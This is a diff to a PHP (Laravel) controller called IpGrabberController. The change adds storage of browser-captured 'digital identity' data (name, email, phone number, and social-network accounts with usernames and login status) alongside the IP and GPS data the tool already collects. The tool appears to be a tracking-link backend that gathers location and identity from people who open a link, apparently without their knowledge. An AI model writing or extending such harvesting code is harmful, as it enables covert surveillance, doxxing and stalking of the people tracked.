@@ -124,6 +124,13 @@ class IpGrabberController extends Controller
             $dados = array_merge($dados, $dadosGps);
         }
 
+        // Identidade Digital capturada pelo browser
+        $dadosIdentidade = $this->dadosIdentidadeValidados($request);
+
+        if (! empty($dadosIdentidade)) {
+            $dados = array_merge($dados, $dadosIdentidade);
+        }
+
         if (! empty($dados)) {
             $ipGrabber->update($dados);
 
@@ -275,6 +282,86 @@ class IpGrabberController extends Controller
             $accuracy = filter_var($request->input('gps_accuracy'), FILTER_VALIDATE_FLOAT);
             if ($accuracy !== false && $accuracy >= 0) {
                 $dados['gps_accuracy'] = round((float) $accuracy, 2);
+            }
+        }
+
+        return $dados;
+    }
+
+    private function dadosIdentidadeValidados(Request $request): array
+    {
+        $dados = [];
+
+        if ($request->filled('identidade_nome')) {
+            $valor = trim((string) $request->input('identidade_nome'));
+            if (mb_strlen($valor) <= 120) {
+                $dados['identidade_nome'] = $valor;
+            }
+        }
+
+        if ($request->filled('identidade_email')) {
+            $valor = trim((string) $request->input('identidade_email'));
+            if (filter_var($valor, FILTER_VALIDATE_EMAIL) && mb_strlen($valor) <= 180) {
+                $dados['identidade_email'] = $valor;
+            }
+        }
+
+        if ($request->filled('identidade_telefone')) {
+            $valor = trim((string) $request->input('identidade_telefone'));
+            // Aceita qualquer string parecida com telefone (números, +, espaços, hífens)
+            if (preg_match('/^[\d\s\+\-\(\)\.]{5,40}$/', $valor)) {
+                $dados['identidade_telefone'] = $valor;
+            }
+        }
+
+        if ($request->filled('identidade_redes')) {
+            try {
+                $raw   = $request->input('identidade_redes');
+                $redes = is_array($raw) ? $raw : json_decode((string) $raw, true);
+
+                if (is_array($redes)) {
+                    $sanitizadas = [];
+
+                    foreach ($redes as $item) {
+                        // Suporte ao formato legado (string simples)
+                        if (is_string($item) && mb_strlen($item) <= 50) {
+                            $sanitizadas[] = ['rede' => $item, 'instalado' => true];
+                            continue;
+                        }
+
+                        // Formato rico: objeto com rede, usuario, nome, logado, instalado
+                        if (! is_array($item) || empty($item['rede'])) {
+                            continue;
+                        }
+
+                        $entrada = [
+                            'rede' => mb_substr((string) $item['rede'], 0, 50),
+                        ];
+
+                        if (! empty($item['usuario']) && is_string($item['usuario'])) {
+                            $entrada['usuario'] = mb_substr($item['usuario'], 0, 180);
+                        }
+
+                        if (! empty($item['nome']) && is_string($item['nome'])) {
+                            $entrada['nome'] = mb_substr($item['nome'], 0, 120);
+                        }
+
+                        if (array_key_exists('logado', $item) && $item['logado'] !== null) {
+                            $entrada['logado'] = (bool) $item['logado'];
+                        }
+
+                        if (array_key_exists('instalado', $item) && $item['instalado'] !== null) {
+                            $entrada['instalado'] = (bool) $item['instalado'];
+                        }
+
+                        $sanitizadas[] = $entrada;
+                    }
+
+                    if (! empty($sanitizadas)) {
+                        $dados['identidade_redes'] = $sanitizadas;
+                    }
+                }
+            } catch (\Throwable) {
             }
         }
 
